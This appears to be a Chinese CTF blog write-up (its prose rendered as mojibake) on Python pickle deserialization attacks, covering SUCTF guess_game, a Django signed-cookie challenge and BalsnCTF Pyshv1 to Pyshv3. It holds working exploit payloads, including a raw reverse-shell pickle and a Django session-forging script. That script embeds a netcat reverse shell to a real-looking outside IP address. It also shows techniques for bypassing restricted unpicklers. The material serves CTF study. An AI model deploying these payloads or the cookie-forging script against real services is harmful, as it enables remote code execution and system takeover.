rel="noopener">converttopickle.py</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre><p>localhost:55555</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><ol><li>ä½¿ç”¨v0ç‰ˆçš„pickleåè®®,ä¿è¯shellcodeçš„é€šç”¨æ€§</li></ol><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><p>è€ƒç‚¹:pickle</p><p>ä»£ç å®¡è®¡ä¸€æ³¢å</p><p>å¦‚æœçŒœå¯¹10æ¬¡åä¼šç»™flag(æœºä¼šåªæœ‰10æ¬¡)</p><p>å› ä¸ºçŸ¥é“æ˜¯è€ƒpickleç›´æ¥å…¨å±€æœç´¢pickleå‘ç°åœ¨serverå¤„æœ‰</p><p><code>ticket = restricted_loads(ticket)</code></p><p>å…¶ä¸­ticketæ˜¯æˆ‘ä»¬å¯æ§ç‚¹</p><p>è·Ÿè¿›å»çœ‹</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:            return getattr(sys.modules[module], name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>æˆ‘ä»¬åªèƒ½åŠ è½½guess_gameä¸­çš„ç±»,å¹¶ä¸”ä¸èƒ½è°ƒç”¨é­”æœ¯æ–¹æ³•.</p><p>åœ¨è¿™ä¸€é¢˜ä¸­æ‹¿åˆ°flagæœ‰ä¸¤ç§æ–¹å¼:</p><ol><li>å‘½ä»¤æ‰§è¡Œ</li><li>é€šè¿‡æ¸¸æˆ</li></ol><p>åœ¨æ€¼ç€find_classè®¸ä¹…ä¹‹åå‘ç°æ²¡åŠæ³•ç»•è¿‡,äºæ˜¯åªèƒ½èµ°é€šè¿‡æ¸¸æˆè¿™ä¸€æ¡è·¯äº†</p><p>è€Œæ¸¸æˆä¸­åˆ¤å®šèµ¢çš„æ¡ä»¶æ˜¯</p><pre><code class="python">class Game    def is_win(self):        return self.win_count == max_round</code></pre><p>å¦‚æœæˆ‘ä»¬èƒ½ç›´æ¥ä¿®æ”¹win_countæˆ–è€…max_roundå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p>æˆ‘ä»¬å‘ç°åœ¨<code>guess_game</code>ä¸­å·²ç»æœ‰ä¸€ä¸ª<code>game = Game()</code>è¿™ä¸ªäº†,ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pickleæ¥åŠ è½½è¿™ä¸ªgameç›´æ¥ä¿®æ”¹</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ä¿®æ”¹äº†</p><p>åœ¨pickleçš„æ“ä½œç ä¸­æˆ‘ä»¬å‘ç°</p><p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>è¿™ä¸€æ¡</p><p>å…¶ä¸­update()å°±å¯ä»¥ä¿®æ”¹gameçš„å±æ€§äº†</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±åªæœ‰ä¸€ä¸ªé—®é¢˜äº†,æ“ä½œç <code>b</code>å¦‚ä½•ä½¿ç”¨</p><p>ä¸€è·¯è·Ÿè¸ªå‘ç°bæ“ä½œç çš„å®ç°</p><pre><code class="python">    def load_build(self):        stack = self.stack        state = stack.pop()        inst = stack[-1]        setstate = getattr(inst, &quot;__setstate__&quot;, None)        if setstate is not None:            setstate(state)            return        slotstate = None        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if state:            inst_dict = inst.__dict__            intern = sys.intern            for k, v in state.items():                if type(k) is str:                    inst_dict[intern(k)] = v                else:                    inst_dict[k] = v        if slotstate:            for k, v in slotstate.items():                setattr(inst, k, v)</code></pre><p>æ²¡æœ‰è°ƒç”¨å‚æ•°,æ ˆé¡¶åº”ä¸ºå­—å…¸,æ ˆé¡¶çš„ä¸‹é¢æ˜¯è¦ä¿®æ”¹çš„å¯¹è±¡</p><p>æœ€åçš„payload:</p><pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre><h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><p>ä»£ç å®¡è®¡å‘ç°åœ¨indexå¤„å¯ä»¥ssti</p><pre><code class="python">def index(request):    django_engine = engines[&#39;django&#39;]    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)    return HttpResponse(template.render(None, request))</code></pre><p>ä½†æ˜¯djangoéš¾ä»¥åˆ©ç”¨sstiå‘½ä»¤æ‰§è¡Œä½†æ˜¯èƒ½è¯»å–æ•æ„Ÿé…ç½®</p><p>ç»“åˆserializer.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in self.blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))class PickleSerializer():    def dumps(self, obj):        return pickle.dumps(obj)    def loads(self, data):        try:            if isinstance(data, str):                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)            file = io.BytesIO(data)            return RestrictedUnpickler(file,                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()        except Exception as e:            return {}</code></pre><p>å’Œsettingæ–‡ä»¶é‡Œçš„ç‰¹æ®Šé…ç½®</p><pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre><p>æŸ¥é˜…djangoæ–‡æ¡£å‘ç°</p><p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p><p>å¯ä»¥ç¡®å®š,è¿™é‡Œæ˜¯é€šè¿‡è¯»å–secret_keyæ¥æ„é€ æ¶æ„cookieæ¥pickleååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ</p><p>æˆ‘ä»¬è·Ÿè¿›django.contrib.sessions.backends.signed_cookiesæ¥äº†è§£å¦‚ä½•ç”Ÿæˆå‚¨å­˜sessionçš„cookie(è¿™é‡ŒèŠ±äº†æˆ‘å¾ˆä¹…çš„æ—¶é—´,ä»å°è¯•çœ‹ä¸€æ­¥ä¸€æ­¥è°ƒè¯•åˆ°çœ‹è°ƒç”¨å †æ ˆå†åˆ°æŸ¥æ–‡æ¡£æœ€åæ‰ææ¸…æ¥šè¿‡ç¨‹,å»ºè®®è‡ªå·±å°è¯•)</p><p>åœ¨ç†è§£ä¹‹åä¾¿æœ‰ä¸€ä¸‹ç”Ÿæˆæ¶æ„cookieçš„ä»£ç </p><pre><code class="python">import base64import datetimeimport jsonimport reimport timeimport zlibimport picklefrom django.utils import baseconvfrom django.utils.crypto import constant_time_compare, salted_hmacfrom django.utils.encoding import force_bytesfrom django.utils.module_loading import import_stringfrom django import corefrom django.core import signingmyexp=b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;def pickle_exp(SECRET_KEY):    data = myexp    compress=True    # Flag for if it&#39;s been compressed or not    is_compressed = False    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;    if compress:        # Avoid zlib dependency unless compress is being used        compressed = zlib.compress(data)        if len(compressed) &lt; (len(data) - 1):            data = compressed            is_compressed = True    base64d = signing.b64_encode(data).decode()    if is_compressed:        base64d = &#39;.&#39; + base64d    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))pickle_exp(&quot;asdasdasdasdas&quot;)</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•æ„é€ æ¶æ„çš„pickleä»£ç çš„é—®é¢˜äº†</p><p>é¢˜ç›®é™åˆ¶äº†åªèƒ½åŠ è½½builtinsé‡Œçš„å±æ€§</p><p>ä¸”å±æ€§åä¸èƒ½ä¸ºä»¥ä¸‹å†…å®¹</p><pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>åˆ©ç”¨<code>__reduce__</code>æ¥ç”Ÿæˆpickleä»£ç å·²ç»æ— æ³•æ»¡è¶³è¦æ±‚äº†,æˆ‘ä»¬ä¸å¾—ä¸æ‰‹å†™pickleä»£ç ,æ€ä¹ˆæ‰‹å†™å°±ä¸è¯¦ç»†è®²äº†</p><p>æˆ‘ä»¬ç°åœ¨æŠŠç›®å…‰èšç„¦åœ¨å¦‚ä½•æ„é€ åˆ©ç”¨é“¾ä¸Š</p><p>builtinsçš„å±æ€§(åˆ é™¤éƒ¨åˆ†)</p><pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre><p>æˆ‘ä»¬æŸ¥çœ‹builtinsçš„å±æ€§æˆ‘ä»¬å‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿,ä¸€ä¸ªæ˜¯getattr,å¦ä¸€ä¸ªæ˜¯globals</p><p>è™½ç„¶é™åˆ¶æˆ‘ä»¬å±æ€§åä¸èƒ½ä¸ºevalå•¥çš„,ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ä¸èƒ½å‡ºç°åœ¨å‚æ•°å¤„</p><p>æ‰€ä»¥<code>getattr(builtins,&quot;eval&quot;)</code>ä¾¿èƒ½å¾—åˆ°evalæ–¹æ³•äº†</p><p>ä½†æ˜¯çœ‹pickleçš„æ“ä½œç å¹¶æ²¡æœ‰å‘ç°èƒ½ç›´æ¥å¯¼å…¥ä¸€ä¸ªæ¨¡å—çš„æ“ä½œ,åœ¨ç»“åˆglobalsæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p><p>æœ€åçš„payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p><p>å…¶å¯¹åº”çš„pickleä»£ç æ˜¯</p><pre><code class="python">b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;</code></pre><p>æœ€åå°±å·®secret_keyäº†,çœ‹åˆ«äººçš„wpéƒ½æ˜¯è°ƒè¯•æ˜“å¾—æ˜“å¾—secret_key//</p><p>ä½†æ˜¯æˆ‘æ˜¯æ²¡æ‰¾åˆ°,äºæ˜¯è‡ªå·±å†™äº†ä¸ªè¿‡æ»¤å™¨</p><p>é€’å½’æŸ¥æ‰¾settings</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>è¿™æ¬¡æ˜¯çœŸçš„æ˜“å¾—äº†:),è‡³æ­¤ç»“æŸ</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;sys&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {}    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>åªå…è®¸sysé‡Œçš„å±æ€§,è€Œä¸”å±æ€§é‡Œä¸èƒ½æœ‰.</p><pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]</code></pre><p>å‘ç°æœ‰ä¸ªmodules,ä½†æ˜¯loadsé‚£é‡Œæœ‰ä¸€ä¸ªæ­»äº¡raise</p><p><code>sys._getframe</code> å¯ä»¥è¿”å›å¸¦æœ‰execçš„å­—å…¸,ä½†æ˜¯å¥½åƒæ²¡å•¥ç”¨</p><p>ç°åœ¨é—®é¢˜æ˜¯ä¸çŸ¥é“å¦‚ä½•å–å‡ºmodulesé‡Œçš„å€¼</p><p>é˜…è¯»æ–‡æ¡£å‘ç°</p><blockquote><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p></blockquote><p>å¯ä»¥ä¿®æ”¹modulesæ¥ä¿®æ”¹æ¨¡å—å†…å®¹</p><pre><code class="shell">&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules&gt;&gt;&gt; import sys&gt;&gt;&gt; dir(sys)[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre><p>ç„¶åsyså°±è¢«æ›¿æ¢æˆsys.modulesäº†,å°±å¯ä»¥æ‹¿åˆ°osäº†</p><p>ç„¶åå†å¯¹sys.modules[â€˜sysâ€™]å†èµ‹å€¼ä¸ºos</p><p>å°±å¯ä»¥import osäº†</p><p>(å¸ˆå‚…ä»¬tql)</p><p>æ„é€ payload</p><pre><code>csysmodulesS&#39;sys&#39;csysmodulesp100scsysget(S&#39;os&#39;tRp101g100S&#39;sys&#39;g101scsyssystem(S&#39;dir&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        print(&quot;Not Implemented QAQ&quot;)if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>è¿™æ¬¡æ›´éªšäº†ç›´æ¥ç»™äº†ä¸ªç©ºæ¨¡å—</p><pre><code class="shell">&gt;&gt;&gt; dir(structs)[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><p><code>__spec__,__loader__,__builtins__</code>æ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„çš„</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æ“ä½œç c(çœ‹é‡è½½åçš„find_classä»£ç ,çœ‹åˆ«äººwpçš„æ—¶å€™æ²¡çœ‹é‡è½½åçš„find_class,ç„¶åè¿wpéƒ½çœ‹ä¸æ‡‚äº†)çš„å®ç°,å‘ç°è°ƒç”¨äº†<code>__import__</code></p><p>åœ¨æ–‡æ¡£ä¸­å‘ç°</p><blockquote><p>æ­¤å‡½æ•°(<code>__import__</code>)ä¼šç”± <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> è¯­å¥å‘èµ·è°ƒç”¨ã€‚ å®ƒå¯ä»¥è¢«æ›¿æ¢ (é€šè¿‡å¯¼å…¥ <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> æ¨¡å—å¹¶èµ‹å€¼ç»™ <code>builtins.__import__</code>) ä»¥ä¾¿ä¿®æ”¹ <code>import</code> è¯­å¥çš„è¯­ä¹‰ </p></blockquote><p>è€Œ<code>__buiutins__</code>é‡Œé¢ä¹Ÿæœ‰<code>__import__</code></p><pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval&gt;&gt;&gt; import osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: eval expected at most 3 arguments, got 5&gt;&gt;&gt; __import__(&#39;print(123)&#39;)123</code></pre><p>æˆåŠŸä¿®æ”¹äº†<code>__import__</code></p><p>æˆ‘ä»¬å†çœ‹é‡è½½çš„find_class</p><p>securePickle.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        module = __import__(module)        return getattr(module, name)#ä¸€èˆ¬é‡è½½éƒ½ä¼šæ”¹æˆif xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</code></pre><p>è€ŒåŸæ¥çš„find_classæ˜¯è¿™æ ·çš„</p><pre><code class="python">def find_class:    __import__(module, level=0)    return getattr(sys.modules[module], name)</code></pre><p>æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ“ä½œç cæ¥å®ç°ä¸€ä¸‹æ“ä½œ</p><pre><code class="python">return getattr(__import__(module), name)</code></pre><p>å¦‚æœèƒ½ä»¤<code>__import__(module)</code>çš„è¿”å›å€¼ä¸º<code>__builtins__</code>æ—¶,å°±å¯ä»¥å–å‡º<code>__builtins__</code>é‡Œçš„å€¼</p><p>ç»“åˆ<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">é­”æœ¯æ–¹æ³•</a><code>__getattribute__</code>ä¾¿å¯ä»¥å®ç°</p><p>äºæ˜¯æ„é€ </p><pre><code class="python">bis=structs.__builtins__structs.__setattr__(&#39;structs&#39;,bis)#nameåªèƒ½ä¸ºstructsbis[&#39;__import__&#39;]=structs.__getattribute__getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre><p>å¯¹åº”çš„pickleä»£ç </p><pre><code>cstructs__builtins__p1000cstructs__setattr__(S&#39;structs&#39;g100tRg100S&#39;__import__&#39;cstructs__getattribute__scstructsget(S&quot;eval&quot;tR(S&#39;print(123)&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>server.py</p><pre><code 